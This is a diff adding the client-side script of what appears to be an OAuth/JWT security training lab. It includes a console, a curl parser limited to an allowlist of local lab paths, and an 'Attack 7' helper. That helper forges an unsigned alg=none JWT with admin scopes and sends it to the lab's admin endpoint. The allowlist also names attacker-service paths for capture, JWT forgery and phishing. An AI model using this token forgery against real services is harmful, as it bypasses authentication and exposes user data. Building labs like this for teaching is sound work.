+function esc(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+// ── Navigation ─────────────────────────────────────────────────────────────────
+function nav(pid) {
+  document.querySelectorAll('.pg').forEach(p => p.classList.remove('on'));
+  const tgt = document.getElementById('pg-' + pid);
+  if (tgt) tgt.classList.add('on');
+  document.querySelectorAll('.ntab').forEach(t => t.classList.toggle('on', t.dataset.p === pid));
+  document.querySelectorAll('.sb-a[data-p]').forEach(a => a.classList.toggle('on', a.dataset.p === pid));
+  document.getElementById('main').scrollTop = 0;
+}
+document.querySelectorAll('[data-p]').forEach(el => {
+  el.addEventListener('click', e => { e.preventDefault(); nav(el.dataset.p); });
+});
+
+// ── Copy button ─────────────────────────────────────────────────────────────────
+function cpb(btn) {
+  const pre = btn.closest('.cb').querySelector('pre.cc');
+  if (!pre) return;
+  navigator.clipboard.writeText(pre.textContent).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = '✓ Copied'; btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = orig; btn.classList.remove('ok'); }, 1600);
+  });
+}
+
+// ── Open URL helper ─────────────────────────────────────────────────────────────
+function openU(svc, path) {
+  const base = svc==='auth'?U.auth : svc==='resource'?U.resource :
+               svc==='attacker'?U.attacker : svc==='monitor'?U.monitor : U.client;
+  window.open(base + path, '_blank');
+}
+
+// ── JWT forgery helper (Attack 7) ──────────────────────────────────────────────
+async function runForgedToken(preId, scope, roles) {
+  const btn = event.target;
+  const R = U.resource, A = U.auth;
+  const b = s => btoa(unescape(encodeURIComponent(s))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+  const header = b(JSON.stringify({ alg: 'none', typ: 'JWT' }));
+  const payload = b(JSON.stringify({
+    sub: 'alice', username: 'alice',
+    scope: scope, roles: roles,
+    iss: A, aud: R,
+    exp: Math.floor(Date.now()/1000) + 3600,
+    iat: Math.floor(Date.now()/1000),
+  }));
+  const forgedToken = header + '.' + payload + '.';
+  const isAdmin = scope.includes('admin');
+  const endpoint = isAdmin ? R + '/api/admin/users' : R + '/api/profile';
+  const path = isAdmin ? '/api/admin/users' : '/api/profile';
+
+  clog('cmd', `$ # Building alg=none forged token (scope: ${scope})`);
+  clog('js',  `  token: ${forgedToken.substring(0,60)}… (${forgedToken.length} chars, empty signature)`);
+  clog('cmd', `$ curl ${endpoint} -H "Authorization: Bearer ${forgedToken.substring(0,30)}…"`);
+  if (!conOpen) togCon();
+  btn.disabled = true; btn.textContent = '…';
+
+  try {
+    const resp = await fetch('/api/curl-proxy', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ service: 'resource', path: path, method: 'GET', headers: { Authorization: 'Bearer ' + forgedToken } }),
+    });
+    const data = await resp.json();
+    if (data.error) { clog('er', '✗ ' + data.error); }
+    else {
+      const cls = data.status < 300 ? 'ok' : data.status < 400 ? 'dim' : 'er';
+      clog(cls, `HTTP ${data.status} ${data.statusText}  (${data.elapsed}ms)`);
+      clog('js', typeof data.body==='object' ? JSON.stringify(data.body,null,2) : String(data.body).substring(0,2000));
+    }
+  } catch(e) { clog('er', 'Request failed: ' + e.message); }
+  clog('dim', '');
+  btn.disabled = false; btn.textContent = '▶ Run Forged';
+}
+
+// ── Console ─────────────────────────────────────────────────────────────────────
+let conOpen = false;
+function togCon() {
+  conOpen = !conOpen;
+  document.getElementById('con').classList.toggle('open', conOpen);
+  document.getElementById('main').style.paddingBottom = conOpen ? '296px' : '';
+  if (conOpen) document.getElementById('con-in').focus();
+}
+document.getElementById('con-in').addEventListener('keydown', e => { if (e.key === 'Enter') sendCon(); });
+
+function clog(cls, txt) {
+  const out = document.getElementById('con-out');
+  const d = document.createElement('div');
+  d.className = 'cl ' + cls; d.textContent = txt;
+  out.appendChild(d); out.scrollTop = out.scrollHeight;
+}
+
+const ALLOW_PATHS = [
+  /^\/oauth\/authorize(\?.*)?$/,
+  /^\/oauth\/token$/,
+  /^\/oauth\/jwks$/,
+  /^\/admin\/audit-log(\?.*)?$/,
+  /^\/admin\/tokens(\?.*)?$/,
+  /^\/admin\/refresh-tokens(\?.*)?$/,
+  /^\/admin\/clients(\?.*)?$/,
+  /^\/admin\/mode$/,
+  /^\/.well-known\/oauth-authorization-server$/,
+  /^\/health$/,
+  /^\/api\/profile$/,
+  /^\/api\/admin\/users$/,
+  /^\/api\/jwt-attack-demo$/,
+  /^\/capture(\?.*)?$/,
+  /^\/api\/latest$/,
+  /^\/dashboard(\?.*)?$/,
+  /^\/forge-jwt$/,
+  /^\/phishing$/,
+];
+
+function resolveAliases(cmd) {
+  return cmd
+    .replace(/\bAUTH\b/g,     U.auth)
+    .replace(/\bRESOURCE\b/g,  U.resource)
+    .replace(/\bATTACKER\b/g,  U.attacker)
+    .replace(/\bMONITOR\b/g,   U.monitor)
+    .replace(/\bCLIENT\b/g,    U.client);
+}
+
+function parseCurl(raw) {
+  const cmd = resolveAliases(raw.replace(/\\\n/g, ' ').replace(/\s+/g, ' ').trim());
+  // Extract first http:// URL that isn't inside a -d "redirect_uri=..." value
+  const urlM = cmd.match(/(?:^|\s)curl[\s\S]*?\s(https?:\/\/[^\s'"]+)/);
+  const firstUrl = urlM ? urlM[1] : cmd.match(/https?:\/\/[^\s'"]+/)?.[0];
+  if (!firstUrl) return { err: 'No URL found in command. Example: curl AUTH/health' };
+  const fullUrl = firstUrl;
+  // Port-based service detection - robust regardless of hostname
+  let svc = null, pq = null;
+  try {
+    const u = new URL(fullUrl);
+    const port = u.port || (u.protocol === 'https:' ? '443' : '80');
+    const authPort = new URL(U.auth).port || '3001';
+    const resPort  = new URL(U.resource).port || '3003';
+    const atkPort  = new URL(U.attacker).port || '3004';
+    if (port === authPort)  { svc = 'auth';     pq = u.pathname + u.search; }
+    if (port === resPort)   { svc = 'resource';  pq = u.pathname + u.search; }
+    if (port === atkPort)   { svc = 'attacker';  pq = u.pathname + u.search; }
+  } catch(_) {}
+  if (!svc) return { err: `URL must point to auth (:${new URL(U.auth).port||3001}), resource (:${new URL(U.resource).port||3003}), or attacker (:${new URL(U.attacker).port||3004}).` };
+  if (!pq || !ALLOW_PATHS.some(rx => rx.test(pq)))
+    return { err: `Path "${(pq||'').split('?')[0]}" not in allowlist. Allowed paths: /oauth/token, /oauth/authorize, /api/profile, /api/admin/users, /capture, /api/latest, /health…` };
+  const method = (cmd.match(/-X\s+(\w+)/i) || [])[1]?.toUpperCase() || 'GET';
+  const headers = {};
+  let hm; const hre = /-H\s+["']([^"']+)["']/g;
+  while ((hm = hre.exec(cmd)) !== null) {
+    const [k, ...vp] = hm[1].split(/:\s*/);
+    if (['authorization','content-type','accept'].includes(k.toLowerCase()))
+      headers[k.trim()] = vp.join(': ').replace(/[\r\n]/g, '').substring(0, 512);
+  }
+  if (method === 'POST' && !headers['Content-Type'] && !headers['content-type'])
+    headers['Content-Type'] = 'application/x-www-form-urlencoded';
+  const bodyParts = [];
+  let bm; const bre = /-d\s+["']([^"']+)["']/g;
+  while ((bm = bre.exec(cmd)) !== null) bodyParts.push(bm[1]);
+  const body = bodyParts.length ? bodyParts.join('&') : null;
+  return { service: svc, path: pq, method, headers, body };
+}
+
+async function execCmd(raw, btn) {
+  if (!conOpen) togCon();
+  const display = resolveAliases(raw).replace(/\\\n\s*/g, ' ').replace(/\s+/g, ' ').trim();
+  clog('cmd', '$ ' + display);
+  if (btn) { btn.disabled = true; btn.textContent = '…'; }
+  const parsed = parseCurl(raw);
+  if (parsed.err) { clog('er', '✗ ' + parsed.err); if (btn) { btn.disabled = false; btn.textContent = '▶ Run'; } return; }
+  try {
+    const resp = await fetch('/api/curl-proxy', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(parsed),
+    });
+    const data = await resp.json();
+    if (data.error) { clog('er', '✗ ' + data.error); }
+    else {
+      const sCode = data.status;
+      const cls = sCode < 300 ? 'ok' : sCode < 400 ? 'dim' : 'er';
+      const statusLabel = {200:'OK',201:'Created',204:'No Content',301:'Moved Permanently',302:'Found',304:'Not Modified',400:'Bad Request',401:'Unauthorized',403:'Forbidden',404:'Not Found',429:'Too Many Requests',500:'Internal Server Error'}[sCode] || data.statusText;
+      clog(cls, `HTTP ${sCode} ${statusLabel}  (${data.elapsed}ms)`);
+      const b = data.body;
+      if (typeof b === 'object') {
+        if (b.error) {
+          clog('er', `  error: "${b.error}"`);
+          if (b.error_description) clog('er', `  error_description: "${b.error_description}"`);
+          if (b.attack_prevented === true)  clog('ok', '  attack_prevented: true  ✅ Mitigation worked!');
+          if (b.attack_prevented === false) clog('er', '  attack_prevented: false  ⚠️  Attack succeeded!');
+        } else {
+          clog('js', JSON.stringify(b, null, 2));
+        }
+      } else {
+        clog('js', String(b).substring(0, 3000));
+      }
+    }
+  } catch(e) { clog('er', '✗ Network error: ' + e.message); }
+  clog('dim', '─────────────────────────────────────');
+  if (btn) { btn.disabled = false; btn.textContent = '▶ Run'; }
+}
+
+function runC(btn, id) { execCmd(document.getElementById(id)?.textContent || '', btn); }
+function sendCon() {
+  const v = document.getElementById('con-in').value.trim();
+  if (v) { document.getElementById('con-in').value = ''; execCmd(v, null); }
+}
+
+// ── Init ────────────────────────────────────────────────────────────────────────
+loadCfg();
+setInterval(loadCfg, 15000);
+
+// ── Mobile sidebar ─────────────────────────────────────────────────────────────
+function toggleSb(){
+  const sb = document.getElementById('sb');
+  const ov = document.getElementById('sb-overlay');
+  const open = sb.classList.toggle('open');
+  ov.classList.toggle('open', open);
+}
+function closeSb(){
+  document.getElementById('sb').classList.remove('open');
+  document.getElementById('sb-overlay').classList.remove('open');
+}
+// Close sidebar when a nav item is clicked on mobile
+document.querySelectorAll('.sb-a').forEach(el => {
+  el.addEventListener('click', () => {
+    if (window.innerWidth <= 860) closeSb();
+  });
+});
+</script>
+</body>
+</html>
